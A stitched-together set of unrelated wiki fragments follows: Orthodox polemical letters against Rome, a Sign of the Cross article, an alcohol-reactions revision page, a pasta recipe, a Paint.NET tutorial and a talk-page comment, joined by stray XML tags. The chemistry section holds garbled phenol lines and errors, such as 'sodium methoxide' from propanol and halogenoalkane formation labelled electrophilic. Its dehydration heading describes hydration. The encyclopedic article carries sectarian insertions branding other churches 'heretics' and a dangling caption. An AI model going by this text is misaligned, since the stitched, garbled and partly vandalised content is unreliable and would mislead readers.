21. Therefore, brethren, and sons beloved in the LORD, having purified your souls in obeying the truth (1 Pet. i. 22), let us give the more earnest heed to the things which we have heard, lest at any time we should let them slip. (Heb. ii. 1.) The faith and confession we have received is not one to be ashamed of, being taught in the Gospel from the mouth of our LORD, witnessed by the holy Apostles, by the seven sacred Ecumenical Councils, preached throughout the world, witnessed to by its very enemies, who, before they apostatized from orthodoxy to heresies, themselves held this same faith, or at least their fathers and fathers' fathers thus held it. It is witnessed to by continuous history, as triumphing over all the heresies which have persecuted or now persecute it, as ye see even to this day. The succession of our holy divine fathers and predecessors beginning from the Apostles, and those whom the Apostles appointed their successors, to this day, forming one unbroken chain, and joining hand to hand, keep fast the sacred inclosure of which the door is Christ, in which all the orthodox Flock is fed in the fertile pastures of the mystical Eden, and not in the pathless and rugged wilderness, as his Holiness supposes (p. 7.1.12). Our Church holds the infallible and genuine deposit of the Holy Scriptures, of the Old Testament a true and perfect version, of the New the divine original itself. The rites of the sacred Mysteries, and especially those of the divine Liturgy, are the same glorious and heartquickening rites, handed down from the Apostles. No nation, no Christian communion, can boast of such Liturgies as those of James, Basil, Chrysostom. The august Ecumenical Councils, those seven pillars of the house of Wisdom, were organized in it and among us. This, our Church, holds the originals of their sacred definitions. The Chief Pastors in it, and the honorable Presbytery, and the monastic Order, preserve the primitive and pure dignity of the first ages of Christianity, in opinions, in polity, and even in the simplicity of their vestments. Yes! verily, &quot;grievous wolves&quot; have constantly attacked this holy fold, and are attacking it now, as we see for ourselves, according to the prediction of the Apostle, which shows that the true lambs of the great Shepherd are folded in it; but that Church has sung and shall sing forever: &quot; They compassed me about; yea, they compassed me about: but in the name of the Lord I will destroy them (Ps. cxviii. l1). Let us add one reflection, a painful one indeed, but useful in order to manifest and confirm the truth of our words:—All Christian nations whatsoever that are today seen calling upon the Name of Christ (not excepting either the West generally, or Rome herself, as we prove by the catalogue of her earliest Popes), were taught the true faith in Christ by our holy predecessors and fathers; and yet afterwards deceitful men, many of whom were shepherds, and chief shepherds too, of those nations, by wretched sophistries and heretical opinions dared to defile, alas! the orthodoxy of those nations, as veracious history informs us, and as St. Paul predicted.

22. Therefore, brethren, and ye our spiritual children, we acknowledge how great the favor and grace which God has bestowed upon our Orthodox Faith, and on His One, Holy, Catholic, and Apostolic Church, which, like a mother who is unsuspected of her husband, nourishes us as children of whom she is not ashamed, and who are excusable in our high-toned boldness concerning the hope that is in us. But what shall we sinners render to the LORD for all that He hath bestowed upon us? Our bounteous LORD and God, who hath redeemed us by his own Blood, requires nothing else of us but the devotion of our whole soul and heart to the blameless, holy faith of our fathers, and love and affection to the Orthodox Church, which has regenerated us not with a novel sprinkling, but with the divine washing of Apostolic Baptism. She it is that nourishes us, according to the eternal covenant of our Savior, with His own precious Body, and abundantly, as a true Mother, gives us to drink of that precious Blood poured out for us and for the salvation of the world. Let us then encompass her in spirit, as the young their parent bird, wherever on earth we find ourselves, in the north or south, or east, or west. Let us fix our our eyes and thoughts upon her divine countenance and her most glorious beauty. Let us take hold with both our hands on her shining robe which the Bridegroom, &quot;altogether lovely,&quot; has with His own undefiled hands thrown around her, when He redeemed her from the bondage of error, and adorned her as an eternal Bride for Himself. Let us feel in our own souls the mutual grief of the children-loving mother and the mother-loving children, when it is seen that men of wolfish minds and making gain of souls are zealous in plotting how they may lead her captive, or tear the lambs from their mothers. Let us, Clergy as well as Laity, cherish this feeling most intensely now, when the unseen adversary of our salvation, combining his fraudful arts (p. xi. 1. 2-25), employs such powerful instrumentalities, and walketh about everywhere, as saith St. Peter, seeking whom he may devour; and when in this way, in which we walk peacefully and innocently, he sets his deceitful snares.

23. Now, the God of peace, &quot;that brought again from the dead that great Shepherd of the sheep,&quot; &quot;He that keepeth Israel,&quot; who &quot;shall neither slumber nor sleep,&quot; &quot;keep your hearts and minds,&quot; &quot;and direct your ways to every good work.&quot;

Peace and joy be with you in the LORD.

== Letter to Ecumenical Patriarch Bartholomew ==
Holy Community, Holy Mountain Athos
Karyes, 30 December 2006
Protocol Number 2/7/2310
The recent visit of Pope Benedict XVI to the Ecumenical Patriarchate on the occasion of that Throne's feast-day celebration of Saint Andrew (30th November 2006) and thereafter the visit by His Beatitude the Archbishop of Athens Christodoulos to the Vatican on (14th December 2006) provoked a variety of impressions, evaluations and reactions. We shall skip those things that the secular Press had evaluated as positive or negative, to focus on those things that pertain to our salvation, for whose sake we came out from the world to live in the wilderness of the Holy Mountain.
As Monks of the Holy Mountain, we respect the Ecumenical Patriarchate, under whose canonical jurisdiction we belong. We honor and venerate His All Holiness Ecumenical Patriarch Bartholomew and we rejoice in all that he has achieved and so labored for, in a Godly manner, for the Church. We especially commemorate his solid and untiring defense of the Ecumenical Patriarchate, amid the many unfavorable conditions that exist, as well as his support for impoverished local Orthodox Churches and the care that is taken to spread the message of the Orthodox Church throughout the world. Furthermore, we the Monks of the Holy Mountain honor the Most Holy Church of Greece, from which most of us grew up in, and we respect His Beatitude the Primate.
However, the events that took place during the recent visits of the Pope to Patriarchate and of His Beatitude the Archbishop to the Vatican evoked deep sorrow in our hearts.
We desire and we struggle through our way of life to safeguard the trust willed to us by the Holy Fathers, which was bequeathed to us by the holy Founders of our Sacred Monasteries and the blessed reposed fathers who have gone before us. We strive to the best of our ability to live the mystery of the Church and the unblemished Orthodox Faith, according to what we are daily taught by the divine Services, the sacred readings, and the teachings in general of the Holy Fathers which are set out in their writings and in the decisions of the Ecumenical Synods. We safeguard our dogmatic conscience &quot;like the apple of our eye&quot;, and we build on it, by applying ourselves to God-pleasing labors and the meticulous study of the achievements of the holy Confessor Fathers when they struggled against the miscellaneous heresies, and especially of our father among the saints, Gregory of Palamas, the Holy Martyrs of the Holy Mountain and the Holy Martyr Kosmas the First, whose sacred relics we kiss with every honor and whose sacred memory we celebrate. We are afraid to remain silent, whenever issues arise that pertain to the trust that our Fathers left us. Our responsibility, towards the most venerable fathers and brothers of the overall brotherhood of the Holy Mountain and towards the pious faithful of the Church who regard Athonite Monasticism as their non-negotiable guardian of sacred Tradition, weighs heavily upon our conscience,
The visits of the Pope at the Patriarchate and the Archbishop's visit at the Vatican may have secured certain benefits of a secular nature, however, during those visits, various other events took place which were not according to the lawful custom of Orthodox Ecclesiology, or agreed commitments were made that would neither benefit the Orthodox Church, nor any heterodox Christians.
First of all, the Pope was received as though he were a canonical (proper) bishop of Rome. During the service, the Pope wore an omophorion; he was addressed by the Ecumenical Patriarch with the greeting &quot;Blessed is the one who comes in the name of the Lord&quot; as though it were Christ the Lord; he blessed the congregation and he was commemorated as &quot;Most Holy&quot; and &quot;His Beatitude the Bishop of Rome&quot;. Furthermore, the Pope's presiding on the Bishop's Throne while wearing an omophorion during the Orthodox Divine Liturgy; also, the reciting of the &quot;Lord's Prayer&quot;, the liturgical kiss with the Patriarch, are displays which go beyond simple common prayer. And all of this, when the papist institution has not retreated at all on any of its heretical teachings and its policy; on the contrary, the Pope is in fact visibly promoting and trying to reinforce Uniates along with the Papist dogmas on primacy and infallibility, and is going even further, with inter-faith common prayers and the pan-religious hegemony of the Pope of Rome that is discerned therein.
As regards with the reception of the Pope at the Patriarchate, we are especially grieved by the fact that all of the media kept repeating the same, incorrect information, that the hymns that were (unduly) sung at the time had been composed by Monks of the Holy Mountain. We take this opportunity to responsibly inform all pious Christians that their composer was not, and could never be, a monk of the Holy Mountain.
Then there is the matter of the attempt by His Beatitude the Archbishop of Athens to commence relations with the Vatican on social, cultural and bio-ethical issues, as well as the objective to mutually defend the Christian roots of Europe (positions which are also found in the Common Declaration of the Pope and the Patriarch of Istanbul), both of which may seem innocuous or even positive, given that their aim is to cultivate peaceful human relations. Nevertheless, it is important that all these do not give the impression that the West and Orthodoxy continue to have the same bases, or lead one into forgetting the distance that separates the Orthodox Tradition from that which is usually presented as the &quot;European spirit&quot;. (Western) Europe is burdened with a series of anti-Christian institutions and acts, such as the Crusades, the &quot;Holy&quot; Inquisition, slave trading and colonization. It is burdened with the tragic division which took on the form of the schism of Protestantism; the devastating world wars, also the man-centered humanism and its atheist view. All of these are the consequence of Rome's theological deviations from Orthodoxy. One after the other, the Papist and the Protestant heresies gradually removed the humble Christ of Orthodoxy and in His place, they enthroned haughty Man. The holy bishop Nicholas of Ochrid and Zitsa wrote the following from Dachau: ®What, then, is Europe? The Pope and Luther.... This is what Europe is, at its core, ontologically and historically¯. The blessed Elder Justin Popovitch supplements the above: ®The 2nd Vatican Synod comprises the rebirth of every kind of European humanism.... because the Synod persistently adhered to the dogma on the Pope's infallibility¯ and he surmises: ®Undoubtedly, the authorities and the powers of (western) European culture and civilization are Christ-expellers¯. This is why it is so important to project the humble morality of Orthodoxy and to support the truly Christian roots of the united Europe; the roots that Europe had during the first Christian centuries, during the time of the catacombs and of the seven holy Ecumenical Synods. It is advisable for Orthodoxy to not saddle itself with foreign sins, and furthermore, the impression should not be given to those who became de-Christianized in reaction to the sidetracking of Western-style Christianity, that Orthodoxy is related to it, thus failing to testify that it is the only authentic Faith in Christ, and the only hope of the peoples of Europe.
The Roman Catholics are obviously attempting to disengage themselves from the decisions of their pursuant (and according to them, Ecumenical) Synods, which had legitimized the Filioque, the Primacy, the Infallibility, the secular authority of the Roman Pontiff, 'created Grace', the immaculate conception of the Holy Mother, and of the Uniates. Despite all these, we Orthodox continue the so-called traditional exchanges of visits, bestowing honors befitting an Orthodox Bishop on the Pope and totally disregarding a series of Sacred Canons which forbid common prayers, while the theological dialogue repeatedly flounders, and, after being dredged from the depths, it again sinks down.
All indications lead to the conclusion that the Vatican is not orienting itself to discard its heretical teachings, but only to &quot;re-interpret&quot; them -- in other words, to veil them.
Roman Catholic ecclesiology varies, from one Encyclical to the next; from the so-called &quot;open&quot; ecclesiology of the Encyclical ®Ut Unum Sint¯, to the ecclesiological exclusivity of the Encyclical ®Dominus Jesus¯. It should be noted that both of the aforementioned views are contrary to Orthodox Ecclesiology. Our conscience duty bound declares the holy Orthodox Church as the only One, Holy, Catholic (overall) and Apostolic Church, does not allow for the recognition of other, heterodox churches and confessions as &quot;sister churches&quot;. &quot;Sister Churches&quot; are only the local Orthodox Churches of the same faith. No other homonymous reference to &quot;sister churches&quot; other than the Orthodox one is theologically permissible.
The &quot;Filioque&quot; is promoted by the Roman Catholic side as yet another legal expression of the teaching regarding the procession of the Holy Spirit, and theologically equivalent to the Orthodox teaching that procession is &quot;only from the Father&quot; -- a view that is unfortunately supported by some of our own theologians.
Besides, the Pontiff is maintaining the Primacy as an inalienable privilege, as one can tell from the recent deletion of the title &quot;Patriarch of the West&quot; by the current Pope Benedict XVI; also from his reference to the worldwide mission of the Apostle Peter and his successors during his homily in the Patriarchal Temple, as well as from his also recent speech, which included the following: ®...within the society, with the Successors of the Apostles, whose visible unity is guaranteed by the Successor of the Apostle Peter, the Ukrainian Catholic Community managed to preserve the Sacred Tradition alive, in its integrity¯ (Catholic News, No.3046/18-4-2006).
The Uniates are being reinforced and reassured in many and various ways, despite the proclamations by the Pope to the contrary. This dishonest stance is witnessed, apart from other instances, by the provocative intervention of the previous Pope, John-Paul II, which led the Orthodox-Roman Catholic dialogue in Baltimore into a disaster, as well as by the letter sent by the current Pope to the Cardinal Ljubomir Husar, the Uniate Archbishop of Ukraine. In this letter dated 22/2/2006, the following is emphatically stressed: ®It is imperative to secure the presence of the two great carriers of the only Tradition (the Latin and the Eastern).... The mission that the Greek Catholic Church has undertaken, being in full communion with the Successor of the Apostle Peter, is two-fold: on one side, it must visibly preserve the eastern Tradition inside the Catholic Church; on the other, it must favor the merging of the two traditions, testifying that they not only can coordinate between themselves, but that they also constitute a profound union amid their variety¯.
Seen in this light, polite exchanges such as the visits of the Pope to Patriarchate (in Istanbul) and the Archbishop of Athens to the Vatican, without the prerequisite of a unity in the Faith, may on the one hand create the false impressions of unity and thus turn away the heterodox who could have looked towards Orthodoxy as being the true Church, and on the other hand, blunt the dogmatic sensor of many Orthodox. Even more, they may push some of the faithful and pious Orthodox, who are deeply concerned over what is taking place inopportunely and against the Sacred Canons, to detach themselves from the corpus of the Church and create new schisms.
Thus, out of love for our Orthodoxy, but with pain as regards the unity of the Church, and with a view to preserve the Orthodox Faith free of all innovations, we proclaim in every direction that which was proclaimed by the Extraordinary, Double, Holy Assembly of our Sacred Community of the Holy Mountain on the 9th / 22nd of April 1980:
We believe that our Holy Orthodox Church is the One, Holy, Catholic and Apostolic Church of Christ, having the fullness of Grace and the Truth, and for this reason, an uninterrupted Apostolic Succession. On the contrary, the &quot;churches&quot; and the &quot;confessions&quot; of the West, having distorted the faith of the Gospel, the Apostles and the Fathers on many points, are deprived of the sanctifying Grace, the true Mysteries (Sacraments) and Apostolic Succession...
Dialogues with the heterodox - if they are intended to inform them about the Orthodox Faith so that when they become receptive of divine enlightenment and their eyes are opened they might return to the Orthodox Faith -- are not condemned.
In no way should a theological dialogue be accompanied by common prayers, participation in liturgical and worship assemblies, by either side and any other activities that might give the impression that our Orthodox Church acknowledges the Roman Catholics (or any Protestant confessions) as a complete Church and the Pope as a canonical (proper) Bishop of Rome. Such acts mislead the Orthodox as well as the Roman Catholic (or Protestant) faithful, who are given a false impression of what Orthodoxy thinks of them....
With the Grace of God, the Holy Mountain remains faithful - as do the Orthodox people of the Lord - to the Faith of the Holy Apostles and the Holy Fathers, and also out of love for the heterodox, who are essentially helped, when the Orthodox with their steadfast Orthodox stance point out the extent of their spiritual ailment and the way they can be cured.
The failed attempts for union during the past teach us that for a permanent union, according to the will of God, within the Truth of the Church, the prerequisite is a different kind of preparation and course, than those which were followed in the past and appear to be followed to this day.
By All the Representatives and Abbots of the common Assembly of the Twenty sacred monasteries of the Holy Mountain Athos.

==The Sign of the Cross==

The '''Sign of the Cross''' is a ceremonial hand motion made by the vast majority of the world's Christians. It is usually accompanied with the [[trinitarian formula]]. For Christians, the motion symbolizes the [[Christian cross|Cross]] on [[Calvary]] by tracing the shape of the cross in the air or on one's own body.  The four points can also signify loving God with all one's heart, soul, mind and strength. There are two particular arrangements one is most likely to observe. One is followed by many of the Eastern Churches, the other by Protestant, Latin and Monophysite heretics. Many professional athletes respect the sign of the cross and can often be seen doing it.

==The gesture==
[[Image:2fingers.jpg|thumb|right|120px|Position of the fingers while making the '''sign of the cross'''.]]

As one moves through the Sign, one recites, at the forehead, &quot;Lord &quot;; at the stomach, &quot;Jesus Christ&quot;, on the right shoulder, &quot;Son of God&quot;; and on the left shoulder, &quot;have mercy on us&quot; followed by a bow(to the ground during great lent). 

Joining two fingers together-the index and the middle finger-and extending them, with the middle finger slightly bent, represents the two natures of Christ: His Divinity and His Humanity. He is God according to His divinity and Man according to His hummanity, perfect in both natures. The index finger represents His divinity, while the middle finger repersents His hummanity, since He came down from on high and saved those below. The bending of the middle finger is interperted to mean that He  bowed the heavens and came down upon the earth for our salvation.

And thus it proper  to make the Sign of the Cross and to bless; thus was it laid down and ordained by the holy fathers; such is the power of the Sign of the Cross, with which  we faithful sign ourselves when we pray, confessing sacramentally the Saviour's economy: His being begotten of God the Father before all creation; His decent to earth from on high; His Crucifixion; and His second coming, which is the sealing of His entire philanthropic dipensation concerning us.

She holds two fingers raised: a hint of the [[Old Believers|old]], i.e., &quot;proper&quot;, way of cross-signing oneself: with two fingers, rather than with three.]]

The sign of the cross must be made according to the rules, in the form of a cross; and the right hand, that is, the dextral hand, must be used in crossing oneself, with the thumb and the two lower fingers joined together, and the extended index finger joined to the middle finger, slightly bent; thus should prelates [and] priests give their blessing and thus should men cross themselves. . . . It befits all Orthodox Christians to hold their hand thus, and to make the sign of the cross upon their face with two fingers, and to bow, as we said before. If anyone should fail to give his blessing with two fingers, as Christ did, or should fail to make the sign of the cross with two fingers, may he be accursed.. . .,
Chapter 31 of [[Stoglavy Sobor|The Council Of The Hundred Chapters]].

Before [[Patriarch Nikon|Nikon the apostate]] in the [[17th century]], it was customary to make the sign of the cross with two fingers (symbolising the dual nature of Christ). The enforcement of the three-finger sign was one of the reasons for the [[Schism (religion)|schism]] with the [[Old Believers]] whose congregations continue to use the two-finger sign of the cross.

Today [[Russian Orthodox|Nikonite heretics]] finish the sign of the cross by moving the hand to the left side, below the stomach, as opposed to the shoulder.  They also frequently make the Sign two times in a row and then bow toward the [[church]], [[icon]], [[cross]], or [[priest]].

==Use of the sign==
In Eastern Orthodox prayers, the sign of the cross is usually made whenever all three persons of the [[Trinity]] are addressed, or even alluded to. Before commencing any prayer, in fact, the Sign is typically made. Upon entering a church, and the sanctuary within the church, one will make the Sign partly as an outward sign of reverence and [[veneration]]. Orthodox laymen will make the Sign as one way of venerating an [[icon]]; [[priest|Priests]] have many more specific occasions upon which to make the Sign. Many members of the Faith will make the Sign in a way that may seem idiomatic to some: for example, if a member is exposed to blasphemy, he or she may make the Sign, partly to suggest subtly and politely to the speaker that an offense has been committed. Some members of the Faith will use the Sign in what almost appears to be a wish for luck; it may be that, or a part of an unsaid prayer for God's blessing, as when beginning a journey or a sports competition.

The Sign of the Cross has minor variants as well: it can be made in the air to bless objects, and it may trace a very small trajectory, such as on the forehead (as the earliest descriptions of the Sign suggest). For a member of the Faith, perhaps the essential element of the Sign is that it physically indicates the direct relevance of the Cross, of the Sacrifice of [[Jesus]], to one's person or surroundings. It is an engagement of the body that affirms what the faithful professes. It is also a sign to others of what one professes.

==Origins of the sign of the cross==
The sign of the cross has been used since the days of the early Church both liturgically and at times as a marker of membership, a symbol of friendship of sorts, due to the persecution of early Christians. The first recorded reference to the Sign is found in the writings of [[Tertullian]] (c. 160-225 A.D.), who says that Christians &quot;at every forward step and movement, at every going in and out, when we put on our clothes and shoes, when we bathe, when we sit at table... in all the ordinary actions of daily life, we trace upon the forehead the sign&quot; (The Chaplet, 3). Other mentions of the sign of the cross and exhortations to perform it whenever possible abound in the [[Church Fathers]].
[[Image:Christus_Ravenna_Mosaic.jpg|thumb|160px|right|[[Ravenna]] mosaic, 6th c.: Jesus is portrayed gesturing a sign of the cross like a Christian priest with his right hand facing outward.([[Christ Pantocrator]]).]]

It does seem clear, though, that the most common way of making the Sign was simply to mark one's forehead, not the entire upper body. The first written record of this enlargement can be seen in [[Nino of Cappadocia|St Nino]], the Apostle of Georgia, from the fourth or fifth century: &quot;St. Nino began to pray and entreat God for a long time. Then she took her (wooden) cross and with it touched the Queen's head, her feet and her shoulders, making the sign of the cross and straightway she was cured&quot; (Studia Biblica, V, 32).&quot; 

One way of explaining the extension of the Sign is to point out that after the Emperor [[Constantine the Great|Constantine]]'s issuance of the [[Edict of Milan]] in 313, which made Christianity an officially legal religion, Christians were freer to cross themselves more emphatically and in a more open manner.

Another explanation of the enlarged scope of the sign of the cross is linked to the [[Monophysite heresy]], condemned by the [[Council of Chalcedon]], whose dogmas are not accepted by the [[Oriental Orthodox| Monophysite heretics ]]. This theory speculates that: &quot;The use of the thumb alone or the single forefinger, which so long as only a small cross was traced upon the forehead was almost inevitable, seems to have given way for symbolic reasons to the use of two fingers (the forefinger and middle finger, or thumb and forefinger) as typifying the two natures and two wills in Jesus Christ. But if two fingers were to be employed, the large cross, in which forehead, breast, etc. were merely touched, suggested itself as the only natural gesture. Indeed some large movement of the sort was required to make it perceptible that a man was using two fingers rather than one.&quot;

      <comment>/* Sodium Substitution */</comment>
      <text xml:space="preserve">= Introduction =
There are six reactions of alcohols that you must be aware of for this module. 
For each you must be able to remember the '''reactants, products and conditions'''. For some of them you must be able to draw the '''mechanisms''' from memory.

Remembering all of these reactions can be made easier with the SHOCED (or SHOCKED with K missing) Mnemonic:

&lt;br&gt;'''S'''odium Substitution
&lt;br&gt;'''H'''alogen alkane formation
&lt;br&gt;'''O'''xidation
&lt;br&gt;'''C'''ombustion
&lt;br&gt;'''E'''sterification
&lt;br&gt;'''D'''ehydration

= Sodium Substitution =
&lt;br&gt;Reactants: An alcohol (e.g. propanol C&lt;sub&gt;3&lt;/sub&gt;H&lt;sub&gt;7&lt;/sub&gt;OH), &lt;br&gt;Sodium Metal (Na)
&lt;br&gt;Products: A “sodium salt” (e.g. sodium methoxide) [alkoxide]
&lt;br&gt;Conditions: n/a
&lt;br&gt;
C&lt;sub&gt;3&lt;/sub&gt;H&lt;sub&gt;7&lt;/sub&gt;OH + Na → C&lt;sub&gt;3&lt;/sub&gt;H&lt;sub&gt;7&lt;/sub&gt;O&lt;sup&gt;-&lt;/sup&gt;Na&lt;sup&gt;+&lt;/sup&gt; + 0.5 H&lt;sub&gt;2&lt;/sub&gt; nd the alphonic acid change in phenol by this reaction


 C6H5SO3Na + NaOH - C6H5ONa+ Na2SO3+H2O        NOW C6H6ONa REACT WITH  HCL AND MADE PHENOL BY THIS REACTION 



  C6H5ONA + HCL - C6H5OH +NaCl

= Halogen Alkane Production (Electrophilic substitution) =
&lt;br&gt;Reactants: An alcohol (e.g. ethanol), a hydrogen halide (e.g. HBr)&lt;br&gt;Products: a Halogen alkane (e.g. bromoethane), water&lt;br&gt;Conditions: no special
&lt;br&gt;C&lt;sub&gt;2&lt;/sub&gt;H&lt;sub&gt;5&lt;/sub&gt;OH + HBr → C&lt;sub&gt;2&lt;/sub&gt;H&lt;sub&gt;5&lt;/sub&gt;Br + H&lt;sub&gt;2&lt;/sub&gt;O

= Oxidation =
Conditions: Acidified Potassium Dichromate (VI) or Sodium Dichromate is used as an oxidising agent. Reaction occurs in reflux.

The products that form from oxidation depend on the structure of the alcohol.

The oxidation of the primary alcohol, ethanol with K&lt;sub&gt;2&lt;/sub&gt;Cr&lt;sub&gt;2&lt;/sub&gt;O&lt;sub&gt;7&lt;/sub&gt;&lt;sup&gt;2-&lt;/sup&gt; / H&lt;sup&gt;+&lt;/sup&gt; is as follows:
CH&lt;sub&gt;3&lt;/sub&gt;CH&lt;sub&gt;2&lt;/sub&gt;OH + [O] → CH&lt;sub&gt;3&lt;/sub&gt;CHO (the aldehyde; ethanal)

''Remember: Oxidation is defined as the gain of Oxygen '''AND/OR''' the loss of hydrogen.''

&lt;br&gt;'''Primary alcohols:''' oxidise to aldehydes and then to carboxylic acids 
&lt;br&gt;'''Secondary alcohols:''' Oxidise to ketones
&lt;br&gt;'''Tertiary alcohols:''' Cannot be oxidised

= Combustion =
(Complete) Combustion of any alcohol produces carbon-dioxide and water.
&lt;br&gt;Burning completely in an excess of oxygen
&lt;br&gt;C&lt;sub&gt;2&lt;/sub&gt;H&lt;sub&gt;5&lt;/sub&gt;OH + 3O&lt;sub&gt;2&lt;/sub&gt; → 2CO&lt;sub&gt;2&lt;/sub&gt; + 3H&lt;sub&gt;2&lt;/sub&gt;O

However, incomplete combustion can occur when oxygen is not in excess (lack of oxygen) which can cause carbon monoxide (CO) or even carbon residue (C) to form as the products.

= Esterification =

Remember the basic principle:

'''ACID + ALCOHOL → ESTER + WATER''' ''(as quoted from Dr. Carmel Stanley of Barnsley College)''

An alcohol (e.g. ethanol) + a carboxylic acid (e.g. ethanoic acid) → an ester (e.g. ethyl ethanoate) and water &lt;br&gt;
Conditions: H&lt;sub&gt;2&lt;/sub&gt;SO&lt;sub&gt;4&lt;/sub&gt; (sulphuric acid) Catalyst

= Dehydration =
Reactants: An alcohol
&lt;br&gt;Products: Alkene + water
&lt;br&gt;Conditions: hot and concentrated sulphuric acid

An alcohol can be formed by the hydration of the alkene; ethene, shown below:
&lt;br&gt;CH&lt;sub&gt;2&lt;/sub&gt;=CH&lt;sub&gt;2&lt;/sub&gt;&lt;sub&gt;(g)&lt;/sub&gt; + H&lt;sub&gt;2&lt;/sub&gt;O&lt;sub&gt;(g)&lt;/sub&gt; → CH&lt;sub&gt;3&lt;/sub&gt;CH&lt;sub&gt;2&lt;/sub&gt;OH&lt;sub&gt;(g)&lt;/sub&gt;
&lt;br&gt;Conditions: '''300''' degrees Celsius&lt;br&gt; '''60''' atm of pressure&lt;br&gt; H&lt;sub&gt;3&lt;/sub&gt;PO&lt;sub&gt;4&lt;/sub&gt; ''(phosphoric acid)'' catalyst.

''I invented this recipe for children and vegetarians as it combines ingredients that they seem to love. It is also excruciatingly easy to make, and it's very tasty. The ingredients, all &quot;good&quot; ingredients, can normally be obtained in any food outlet - not necessarily a supermarket, so it is good for &quot;last minute&quot; and, lastly, it needs only one pan to cook.''

== Ingredients ==

''It is always difficult to provide exact quantities when suggesting a recipe, as it all rather depends on how many people you are cooking for. Let us however assume you are cooking for four people.''

* 1 mugful of your favourite dried [[Cookbook:Pasta|pasta]] per person
* 1 400 gr container of plain Philadelphia [[Cookbook:Cream Cheese|cream cheese]] 
* 1 410 gr tin of [[Cookbook:Corn|sweetcorn]]
* 1 tin of [[Cookbook:Tuna|tuna]] of equal size to the sweet corn
* 3 [[Cookbook:Teaspoon|tsp]] of [[Cookbook:Pesto|pesto]]
* A little ground [[Cookbook:Pepper|pepper]]
* [[Cookbook:Olive Oil|olive oil]]

== Procedure ==

# Put the pasta on to boil in copious amounts of water with a little salt and a drop of olive oil added.
# In a mixing bowl combine all the rest of the ingredients.
# When the pasta is cooked, drain through a colander and add to the bowl.
# Stir through, so that everything becomes well coated.

''Please bear in mind that a REAL Italian will always thoroughly mix up the pasta and the sauce in a large bowl before serving. Serving the &quot;naked&quot; pasta on the plate, and slobbering the sauce on top of it is both lazy and defeats the object of a pasta sauce!''

Serve immediately...

A further thing about this dish is that it is equally delicious as a cold pasta salad, so make plenty of it for lunch, and have it cold for dinner.

''Buon Appetito, Wikibookians !!''

      <text xml:space="preserve">This tutorial demonstrates how to create simple round web-browser buttons using Paint.NET.


To complete this tutorial you will need to download and install the Drop Shadow plugin.

''Download and install the Drop Shadow plugin from http://users.telenet.be/krisvandermotten/Downloads/PaintDotNetEffects.html. Open the zip file and run the Install.exe program.'' 

Begin with an 800 x 600 (default) canvas. 

Use the Ellipse Select tool and (holding the SHIFT key) drag a circle that has a Bounding Rectangle size of 400 x 400 pixels. 

[[Image:GlassButtonsTut00 CircleSize.png]]

IMAGE &gt; Crop to Selection 

Set your Secondary Colour to completely transparent. 

[[Image:GlassButtonsTut 01 SetTransparentColour.png]]

IMAGE &gt; Canvas Size: Select By Percentage with a setting of 125% (ensure the Anchor is set to 'Middle') 

You should now have a circle that is perfectly centred on your canvas. 

[[Image:GlassButtonsTut02 CentredCircle.png]]

Set your Primary Colour to Dark Green - I used Hex: 00660A - and your Secondary Colour to White. 

Use the Magic Wand tool to select your white circle and use the Gradient tool, set on Radial, and use the right-mouse button to draw a gradient starting about 1/3 from the bottom of the circle up to the top. 

[[Image:GlassButtonsTut03 RadialGradient.png]]

Duplicate the Background layer twice. Call the top layer 'Top' and the middle layer 'Middle'. 

Start with the 'Top' layer and choose the Move Selection tool (your circle should still be selected) and grab the top of your circle selection and begin dragging down until the height of the elipse is 350px. 

[[Image:GlassButtonsTut04 Ellipse1.png]] 

Press Delete. 

Go to the 'Middle' Layer and use the Magic Wand to select the area outside the circle and CTRL+I to invert selection. 

Choose the Move Selection tool again and grab the top of the circle and drag down until the height of the elipse is 250px. Delete. 

Go back to the 'Top' layer and EFFECTS &gt; BLURS &gt; Median Blur: Radius 10, Percentile 0. 

&lt;sub&gt;EDIT1 In never versions of Paint.Net: EFFECTS &gt; &lt;u&gt;NOISE&lt;/u&gt; &gt; Median.&lt;/sub&gt;

Use the Magic Wand to select the outside area and CTRL+I to invert. 

Set your Primary Colour to White and Secondary Colour to Dark Grey. 

Fill the crescent White. Press CTRL+D to deselect then EFFECTS &gt; BLURS &gt; Radial Blur: Amount 2. 

Go to the 'Middle' layer and EFFECTS &gt; BLURS &gt; Median Blur: Radius 10, Percentile 0. 


On the 'Top' layer set the blending mode to Screen and adjust the Opacity to 100 (F4 to access Layer

[[Image:GlassButtonsTut06 LayerBlendMode.png]]

Repeat this on the 'Middle' layer. 

Create a new layer and call it 'Control'. Move the 'Control' layer down to above the background and below the 'Middle' layers. 

This is where you are going to put the text or image that relates to your button. 

I am going to make this a 'Refresh' button and will be using the &quot;Webdings&quot; font - letter 'q'. 

Select the Text tool and change the font to 'Webdings'. Increase the font size to 200 (you can do this by typing directly into the font size control). 

Click onto your image and type the letter 'q'. This should give you a 'Refresh' symbol. Use the control arrow to position the symbol in the centre of your button.

EFFECTS &gt; Drop Shadow: Offset-X 0, Offset-y 10, Blur Radius 10. 

&lt;sub&gt;EDIT2 For Drop Shadow:[http://forums.getpaint.net/index.php?/topic/8375-drop-shadow-color-accent-gradient-updated-2010-03-15/] EFFECTS &gt; OBJECT &gt; Drop Shadow&lt;/sub&gt; 

Flatten the image and EFFECTS &gt; Drop Shadow: same settings again.

* Although the idea seems to be very valid I worry whether such books should be considered in this voting system. Their simplicity would lead to few comprehensive books being tagged as official and therefore I would suggest if they could rather be created in another system, appropriate for quicker acceptance of such books. --[[User:82.10.198.113|82.10.198.113]] 19:01, 8 July 2007 (UTC)

* Wikibooks is not US Books and books shouldn't focus solely on the United States.  [[User:Xania|Xania]] [[Image:Flag_of_Italy.svg|15px]][[User talk:Xania|&lt;sup&gt;talk&lt;/sup&gt;]] 19:52, 2 July 2007 (UTC)
** If we ever want to actually write a textbook that could be used in a classroom it is going to have to be geared to a specific country's curriculum standards. Since many of the people who have been suggesting writing these textbooks have mentioned the California standards, and those standards are available online, using that as a test case makes sense to me. While I agree that Wikijunior content should not be US centric as a whole, it is perfectly acceptable, and even necessary for individual books to be so. --[[User:Xixtas|&lt;span style=&quot;color:turquoise&quot;&gt;xixtas&lt;/span&gt;]] &lt;sup&gt;[[User_Talk:Xixtas|&lt;span style=&quot;color:magenta&quot;&gt;talk&lt;/span&gt;]]&lt;/sup&gt; 03:03, 3 July 2007 (UTC)
*** Why not make two, one for the US and one for another country/region.  Like the UK.  Although I doubt they differ that much.  [[User:SRXT|SRXT]] 21:18, 7 August 2007 (UTC)
